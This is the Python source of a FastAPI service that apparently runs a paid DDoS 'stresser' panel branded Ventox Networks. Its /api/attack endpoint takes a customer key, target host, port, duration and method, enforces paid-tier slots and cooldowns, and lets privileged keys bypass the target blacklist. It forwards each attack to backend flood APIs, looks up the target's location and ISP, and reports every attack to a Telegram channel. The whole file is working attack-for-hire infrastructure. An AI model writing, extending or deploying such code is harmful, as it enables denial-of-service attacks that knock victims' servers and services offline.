# -*- coding: utf-8 -*-
from fastapi import FastAPI, Query
from fastapi.responses import Response
from datetime import datetime
import json, time, requests, asyncio, os, socket
from urllib.parse import urlparse

app = FastAPI()

# Load cu h�nh t file
with open("apis.json") as f:
    api_data = json.load(f)
with open("keys.json") as f:
    keys = json.load(f)
with open("config.json") as f:
    config = json.load(f)
with open("blacklist.json") as f:
    blacklist = json.load(f)

cooldowns = {}
userState = {}
attack_sessions = {}

BOT_TOKEN = config.get("telegram_bot_token", "")
CHAT_ID = config.get("telegram_chat_id", "")
THREADS = config.get("threads", 5)
RETURN_FORMAT = config.get("return_format", "pretty")
VERSION = config.get("version", "v2.0.0")
START_TIME = time.time()

# Attack Counter Setup
counter_file = "counter.txt"
if os.path.exists(counter_file):
    with open(counter_file) as f:
        attack_counter = int(f.read().strip())
else:
    attack_counter = 680992

def send_telegram_log(message: str):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message},
            timeout=3
        )
    except Exception as e:
        print("Telegram Error:", e)

def get_ip_info(host: str):
    try:
        parsed_url = urlparse(host)
        clean_host = parsed_url.hostname if parsed_url.hostname else host
        resolved_ip = socket.gethostbyname(clean_host)
        res = requests.get(f"http://ip-api.com/json/{resolved_ip}?fields=66846719", timeout=3).json()
        if res.get("status") == "success":
            res["resolved_ip"] = resolved_ip
            return res
    except Exception as e:
        print("IP Lookup Error:", e)

    return {
        "resolved_ip": host,
        "as": "Unknown",
        "city": "Unknown",
        "country": "Unknown",
        "countryCode": "Unknown",
        "isp": "Unknown",
        "org": "Unknown",
        "regionName": "Unknown",
        "timezone": "Unknown",
        "zip": ""
    }

def is_key_expired(key_data):
    expiry_str = key_data.get("expiry")
    if not expiry_str:
        return False
    try:
        expiry = datetime.strptime(expiry_str, "%d/%m/%Y")
        return datetime.now() > expiry
    except:
        return False

async def release_slot_after(key, duration):
    await asyncio.sleep(duration)
    userState[key] = max(0, userState[key] - 1)
    attack_sessions[key] = [
        s for s in attack_sessions.get(key, [])
        if time.time() < s.get("end_time", 0)
    ]

@app.get("/api/attack")
async def attack(
    key: str = Query(...),
    host: str = Query(...),
    port: int = Query(...),
    time_: int = Query(..., alias="time"),
    method: str = Query(...)
):
    if port <= 0 or time_ <= 0:
        return Response(json.dumps({"status": "error", "message": "Invalid port or time value."}, indent=2), media_type="application/json")

    if key not in keys:
        return Response(json.dumps({"status": "error", "message": "Invalid key."}, indent=2), media_type="application/json")

    key_data = keys[key]
    if key_data.get("banned", False):
        return Response(json.dumps({"status": "error", "message": "Key is banned."}, indent=2), media_type="application/json")
    if is_key_expired(key_data):
        return Response(json.dumps({"status": "error", "message": "Key expired."}, indent=2), media_type="application/json")

    user_id = key_data.get("user", "")
    if host in blacklist.get("hosts", []) or user_id in blacklist.get("users", []):
        if not key_data.get("bypass_blacklist", False):
            return Response(json.dumps({"status": "error", "message": "Target or user is blacklisted."}, indent=2), media_type="application/json")

    if method not in api_data:
        return Response(json.dumps({"status": "error", "message": "Invalid method."}, indent=2), media_type="application/json")

    now = time.time()
    cooldown_time = int(key_data.get("cooldown", 10))
    remaining = cooldown_time - (now - cooldowns.get(key, 0))
    if remaining > 0:
        return Response(json.dumps({"status": "error", "message": f"Cooldown active. Wait {int(remaining)}s"}, indent=2), media_type="application/json")
    cooldowns[key] = now

    userState.setdefault(key, 0)
    if userState[key] >= int(key_data["maxCons"]):
        return Response(json.dumps({"status": "error", "message": "Slot limit reached."}, indent=2), media_type="application/json")

    attack_sessions.setdefault(key, [])

    power_saving = config.get("powersaving", False) or key_data.get("powersaving", False)
    if power_saving and not key_data.get("bypass_blacklist", False):
        for s in attack_sessions[key]:
            if time.time() < s.get("end_time", 0) and s["host"] == host and s["port"] == port:
                return Response(json.dumps({"status": "error", "message": "Attack already ongoing on this target for your key (power saving active)."}, indent=2), media_type="application/json")

    userState[key] += 1
    global attack_counter
    attack_counter += 1
    with open(counter_file, "w") as f:
        f.write(str(attack_counter))
    attack_id = attack_counter

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ipData = get_ip_info(host)
    end_time = time.time() + time_

    attack_sessions[key].append({
        "user": "Ventox Networks",
        "method": method,
        "host": host,
        "port": port,
        "end_time": end_time,
        "duration": time_
    })

    urls = [
        url.replace("<<$host>>", host)
           .replace("<<$port>>", str(port))
           .replace("<<$time>>", str(time_))
        for url in api_data[method]["api"]
    ]

    results = []
    for url in urls[:3] if power_saving else urls:
        start = time.time()
        try:
            requests.get(url, timeout=3)
        except:
            pass
        end = time.time()
        ms = round((end - start) * 1000, 2)
        results.append({"url": url, "ms": ms})

    avg_response_time = round(sum(r.get("ms", 0) for r in results) / len(results), 2) if results else 0

    send_telegram_log(
    "\n".join([
        " Ventox API Services",
        f" Key: {key}",
        f" Target: {host}",
        f" Port: {port}",
        f" Method: {method}",
        f" Time: {time_}s",
        f" Threads: {THREADS}",
        f" VIP: {'Yes' if key_data.get('vip') else 'No'}",
        f" Admin: {'Yes' if key_data.get('admin') else 'No'}",
        f" Slots: {userState[key]}/{key_data['maxCons']}",
        f" Sent: {timestamp}",
        f" Attack ID: #{attack_id}",
        f" Telegram: t.me/ventox_cnc"
    ])
)

    asyncio.create_task(release_slot_after(key, time_))

    response_obj = {
        "VentoxNetworks": "Attack Sent Successfully",
        "status": "success",
        "attack_id": f"#{attack_id}",
        "concurrents_used": userState[key],
        "duration": f"{time_}s",
        "error": False,
        "method_used": method,
        "port": port,
        "target": host,
        "resolved_ip": ipData.get("resolved_ip", host),
        "target_asn": ipData.get("as", "Unknown"),
        "target_city": ipData.get("city", "Unknown"),
        "target_country": ipData.get("country", "Unknown"),
        "target_country_code": ipData.get("countryCode", "Unknown"),
        "target_isp": ipData.get("isp", "Unknown"),
        "target_org": ipData.get("org", "Unknown"),
        "target_region": ipData.get("regionName", "Unknown"),
        "target_timezone": ipData.get("timezone", "Unknown"),
        "target_zip": ipData.get("zip", ""),
        "threads": THREADS,
        "vip": key_data.get("vip", False),
        "admin": key_data.get("admin", False),
        "bypass_blacklist": key_data.get("bypass_blacklist", False),
        "expiry": key_data.get("expiry", "None"),
        "time_to_send": f"{avg_response_time}ms",
        "your_running_attacks": f"{userState[key]}/{key_data['maxCons']}",
        "time_sent": timestamp,
        "owner": "ventox",
        "telegram": "t.me/ventox_cnc"
    }

    return Response(content=json.dumps(response_obj, indent=2), media_type="application/json")

@app.get("/api/methods")
def get_methods():
    return Response(content=json.dumps({"methods": list(api_data.keys())}, indent=2), media_type="application/json")

@app.get("/api/ongoing")
def get_ongoing_attacks():
    current_time = time.time()
    ongoing = {}

    for key, sessions in attack_sessions.items():
        active_sessions = [
            {
                "method": s["method"],
                "host": s["host"],
                "port": s["port"],
                "end_time": datetime.fromtimestamp(s["end_time"]).strftime("%Y-%m-%d %H:%M:%S"),
                "duration": s["duration"]
            }
            for s in sessions if current_time < s["end_time"]
        ]
        if active_sessions:
            ongoing[key] = active_sessions

    return Response(content=json.dumps({"ongoing_attacks": ongoing}, indent=2), media_type="application/json")